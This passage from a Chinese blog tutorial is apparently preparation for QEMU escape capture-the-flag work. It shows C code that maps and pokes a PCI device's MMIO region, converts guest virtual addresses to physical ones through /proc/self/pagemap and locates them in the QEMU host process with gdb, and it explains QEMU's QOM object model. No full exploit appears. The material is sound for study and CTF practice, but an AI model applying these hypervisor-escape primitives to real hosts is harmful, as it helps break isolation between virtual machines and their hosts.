class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//或者void * mmio    = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED, open(&quot;/dev/mem&quot;,2),0xfea00000);</span></span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"><span class="comment">//读写实例</span></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Qemu内存地址转换"><a href="#Qemu内存地址转换" class="headerlink" title="Qemu内存地址转换"></a>Qemu内存地址转换</h1><p>先贴一个经典的图,虽然不知道为什么要贴这张图,但是很多介绍QEMU的文章中都用到了这张图,贴就对了(bushi)</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p>我们知道，在我们的物理机上面进程的虚拟地址必须通过转换才能变为物理地址，被CPU所处理。而QEMU上运行的内核上运行的用户态程序的虚拟地址也需要转换才能变成相应的物理地址，而这个物理地址对应的是在我们宿主机上运行的QEMU的虚拟地址(有点绕，结合上面这个图大概可以明白)</p><p><code>Guest&#39; processes</code>的虚拟地址经过页表转换变成<code>Guest&#39; processes</code>的物理地址，而这个<code>Guest&#39; processes</code>的物理地址实际上对应着QEMU进程的一块虚拟地址</p><p>那么我们如何从<code>Guest&#39; processes</code>的虚拟地址来找到它的物理地址，进而找到对应的QEMU虚拟地址区域呢</p><p>我们可以通过下列程序来查看,先通过调试来验证，然后再说明原理(这里用的是后面例题<code>HITB-GSEC-2017-babyqemu</code>的QEMU、内核以及文件系统)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr;</span><br><span class="line">    <span class="keyword">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将其编译、文件系统重打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">photon@Photon:/mnt/d/<span class="built_in">test</span>/pwn/qemu_escape/babyqemu/core$ gcc gva2gpa.c -static -o gva2tpa</span><br><span class="line">photon@Photon:/mnt/d/<span class="built_in">test</span>/pwn/qemu_escape/babyqemu/core$ find . | cpio -H newc -o &gt; ../rootfs.cpio</span><br></pre></td></tr></table></figure><p>当然也可以通过SCP的形式传进QEMU，但不知道为什么在这个例子中没有成功，所以就用了调试内核常用的方法</p><p>需要注意的是我们调试的是QEMU而不是内核，所以与调试Kernel题的时候在QEMU选项上面加上<code>-S -s</code>然后gdb里面<code>target remote:1234</code>不一样，这里我们将选项写入某个文件(cmd)中</p><p>然后利用</p><p><img src="https://s2.loli.net/2023/05/10/NbDF8dJ56nKVYfZ.png" alt="image-20230510190237201"></p><p>即可</p><p>或者直接运行<code>lauch.sh</code>,然后再起一个终端用gdb attach把qemu进程给attach上即可(感觉后面方便一点？这里用了后者)</p><p><img src="https://s2.loli.net/2023/05/10/iv6APDloFnMwmHO.png" alt="image-20230510190903415"></p><p>这里有个大小为<code>0x4000000</code>(起始地址为 <code>0x7f7473600000</code>)的就是我们<code>Guest’s Process</code>映射的QEMU虚拟地址部分(因为qemu虚拟机对应的内存为1G)</p><p>所以我们直接加上得到的偏移<code>0x3a42b20</code>即可获取我们写入字符串对应QEMU进程的位置</p><p><img src="https://s2.loli.net/2023/08/09/YZ9gXjfMebqBDUw.png" alt="image-20230510191046153"></p><p>那么话说回来，这样转换的原理是什么？其实原理很简单，内核为我们提供了一个叫做pagemap的接口，比如这里我们打开的<code>/proc/self/pagemap</code>，他会为没饿过page生成一个64位的描述符，描述虚拟地址这一页对应的物理帧号或者SWAP里面的偏移</p><p>可以细致分析一下主要代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是<code>gva_to_gfn</code>，把从虚拟地址找到帧号。<code>/proc/self/pagemap</code>相当于一个表，其表项大小为8字节，所以假设我们序号为n，则通过偏移8*n(也就是n&lt;<3)即可找到对应表项。而这里的序号也即是我们虚拟地址与页大小MASK之后的高位(如果不懂得话这里可以去了解一下页表转换的过程，根据页表级数的不同可能会有多级页目录表、页表之类的)。由于页大小为1<<12,所以最后偏移就是` (addr >&gt;12)&lt;<3`,修改一下即是`(addr>&gt;9 ) &amp;~7`(右移12位然后再左移3位相当于右移9位，然后低3位置零。其实我感觉这样写很奇怪)</p><p>找到偏移之后通过<code>lseek</code>与<code>read</code>操作找到表项，进行&amp;PFN_PFN之后与业内偏移拼接一下即可得到物理地址。其上述过程可以修改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva2gpa</span><span class="params">(<span class="keyword">void</span> * addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="keyword">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="keyword">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实简而言之就是个查表找到高位然后和偏移拼接的过程，甚至不需要多级页表(因为<code>/proc/self/pagemap</code>接口帮你搞好了)</p><h1 id="QOM-Qemu-Object-Module-模型"><a href="#QOM-Qemu-Object-Module-模型" class="headerlink" title="QOM(Qemu Object Module)模型"></a>QOM(Qemu Object Module)模型</h1><p>QOM是QEMU提供的一套面向对象编程模型(虽然QEMU是用C来写的，但是利用QOM我们也能进行面向对象的一些操作)，用来实现一些设备</p><p>我们可以通过这个模型，来自己编写QEMU中的设备，它主要由四个组件构成</p><ul><li><code>Type</code> 定义一个类</li><li><code>Class</code> 存储类静态数据和函数指针</li><li><code>Object</code> 存储动态数据，动态分配一个类的实例</li><li><code>Property</code> 动态对象数据的访问器</li></ul><h2 id="TypeInfo"><a href="#TypeInfo" class="headerlink" title="TypeInfo"></a>TypeInfo</h2><p><code>TypeInfo</code>是用户来定义一个<code>Type</code>的结构体，我们定义了一个<code>TypeInfo</code>之后，调用<code>type_register(TypeInfo)</code>或者<code>type_register_static(TypeInfo)</code>函数，就能生成一个<code>TypeImpl</code>实例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//include/qom/object.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">//类型名</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *parent; <span class="comment">//父类型名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> instance_size; <span class="comment">//对象大小(Class)</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_init)(Object *obj); <span class="comment">//相当于构造函数，用以初始化对象。和C++类似，调用前父类已经被初始化，所以子类只需要初始化自己的成员变量</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_post_init)(Object *obj); <span class="comment">//在所有的instance_init函数被调用之后，该函数被调用来结束一个对象的初始化</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_finalize)(Object *obj);<span class="comment">//相当于析构函数。和C++的析构顺序一样，在父类的析构函数前调用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> abstract;<span class="comment">//标识虚类。若为真则为虚类，无法被直接实例化</span></span><br><span class="line">    <span class="keyword">size_t</span> class_size; <span class="comment">//这个对象的类对象大小(和instance_size有什么区别？)</span></span><br><span class="line">    <span class="keyword">void</span> (*class_init)(ObjectClass *klass, <span class="keyword">void</span> *data); <span class="comment">//该函数在所有父类初始化结束后被调用，让一个类设置它的默认虚方法指针，也能重写父类的虚方法</span></span><br><span class="line">    <span class="keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="keyword">void</span> *data); <span class="comment">//在所有的父类被初始化之后，但是类自身初始化之前，为所有的基类调用改函数</span></span><br><span class="line">    <span class="keyword">void</span> *class_data;<span class="comment">//传递给class init和class_base_init的数据</span></span><br><span class="line"></span><br><span class="line">    InterfaceInfo *interfaces;<span class="comment">//这个类型相关的接口，指向一个以0元素结尾的静态数组</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们想定义一个类的时候，我们需要定义一个<code>TypeInfo</code>类型的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo Test_type_info</span><br><span class="line">&#123;</span><br><span class="line">    .name = <span class="string">&quot;TEST_TYPE&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .interfaces = (InterfaceInfo[])</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">staic <span class="keyword">void</span> Test_register_types(<span class="keyword">void</span>) <span class="comment">//注册</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;Test_type_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><p>我们可以通过<code>Class</code>结构体来定义类的静态内容，比如静态成员，函数表之类的，它应当继承自某个Class类型</p><p><code>ObjectClass</code>是所有类的基类</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Type type;</span><br><span class="line">GSList *interfaces;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    </span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable* properties;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所有的qemu总线，设备等的<code>type_register_static</code>执行完成之后(也就是他们的<code>TypeImpl</code>实例被创建成功之后)，qemu会在<code>type_initialize</code>函数中去实例化对应的<code>ObjectClasses</code></p><p>比如我们可以定义一个<code>Test</code>的Class</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ObjectClass parent;</span><br><span class="line">...<span class="comment">//可以添加其他的成员</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在类的定义中父类都在第一个字段，让父类和子类可以直接转换。类初始化时会先初始化它的父类</p><p>这样定义之后，我们也需要在之前的类定义那里去修改一下与<code>Class</code>相关的构造函数等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">test_class_init</span><span class="params">(ObjectClass *klass,<span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo test_type_info = </span><br><span class="line">&#123;</span><br><span class="line">    .name = <span class="string">&quot;TEST_TYPE&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(TestClass),</span><br><span class="line">    .class_init = test_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[])</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p><code>Object</code>类型用来表示类的一个实例对象。刚刚所说的<code>TypeInfo</code>以及<code>ObjectClass</code>只是定义的类型，而非具体的设备，我们之前所介绍的<code>TypeInfo</code>结构体中的有两个函数指针<code>instance_init</code>以及<code>class_init</code>，前者负责初始化具体<code>Object</code>结构体,而后者负责初始化<code>ObjectClass</code>结构体</p><p>这个类型我们同样需要定义，其继承自某个<code>Object</code></p><p>同<code>ObjectClass</code>类似，所有<code>Object</code>结构体类型的基类都是<code>Object</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="keyword">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同样，我们在类定义那里需要修改一下与<code>Object</code>相关的东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TestObject</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Object parent;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_object_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo test_type_info = </span><br><span class="line">&#123;</span><br><span class="line">    .name = <span class="string">&quot;TEST_TYPE&quot;</span>,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(TestClass),</span><br><span class="line">    .class_init = test_class_init,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(TestObject),</span><br><span class="line">    .instance_init = test_object_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[])</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PCI的内存空间"><a href="#PCI的内存空间" class="headerlink" 